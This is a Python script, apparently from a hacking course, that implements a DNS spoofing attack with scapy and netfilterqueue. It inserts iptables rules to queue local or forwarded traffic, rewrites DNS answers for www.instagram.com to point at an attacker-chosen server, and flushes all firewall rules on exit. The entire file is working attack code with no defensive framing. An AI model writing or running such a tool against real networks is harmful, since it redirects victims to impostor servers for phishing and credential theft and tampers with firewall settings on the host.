import netfilterqueue
import subprocess
import argparse
import scapy.all as scapy

def parse_arguments():
    parser = argparse.ArgumentParser()
    scope = parser.add_mutually_exclusive_group(required=True)
    scope.add_argument('-l', '--local', action='store', help='Use in Local Mode')
    scope.add_argument('-r', '--remote', action='store', help='Use in Remote Mode')

    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument('-d', '--drop', action='store', help='Drop Packets')
    mode.add_argument('-f', '--forward', action='store', help='Forward Packets')

    parser.add_argument('-s', '--server', type=str, required=True, help='Spoofed Server IP Address')
    return parser.parse_args()

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if 'www.instagram.com' in qname:
            print('[+] Spoofing target')
            answer = scapy.DNSRR(rrname=qname, rdata=options.server)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))
    if options.drop:
        packet.drop()
    elif options.forward:
        packet.accept()
    # print(scapy_packet.show())


options = parse_arguments()

if options.local:
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
elif options.remote:
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    print('Reseting IP Table...')
    subprocess.call('iptables --flush', shell=True)
    print('Exiting...')
